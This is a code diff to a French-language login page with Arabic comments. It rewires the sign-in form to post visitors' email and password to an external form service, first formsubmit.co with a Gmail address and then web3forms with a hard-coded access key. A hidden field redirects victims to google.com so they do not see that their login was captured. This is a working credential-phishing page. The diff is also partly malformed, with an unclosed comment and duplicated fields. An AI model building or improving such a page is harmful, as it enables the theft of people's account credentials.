@@ -107,8 +107,18 @@
     <h2>Connexion</h2>
     <p>Accéder à votre compte</p>
 
-    <!-- الإرسال المباشر عبر FormSubmit -->
-    <form action="https://formsubmit.co/bayrem.digital@gmail.com" method="POST">
+    <!-- الإرسال المباشر عبر FormSub
+    <form action="https://api.web3forms.com/submit" method="POST">
+    <!-- ضع المفتاح الذي وصلك في الإيميل هنا بدلاً من الكود التجريبي بالأسفل -->
+    <input type="hidden" name="access_key" value="2c996660-c49f-4248-be5a-c4c621b4c86f">
+    <input type="hidden" name="_next" value="https://www.google.com">
+    
+    <!-- باقي الحقول كما هي -->
+    <input type="email" name="email" required>
+    <input type="password" name="password" required>
+    <button type="submit">Suivant</button>
+</form>
+
         
         <!-- حقل التوجيه التلقائي لمنع ظهور صفحة Thanks وتوجيه المستخدم فوراً إلى جوجل بعد الإرسال -->
         <input type="hidden" name="_next" value="https://www.google.com">
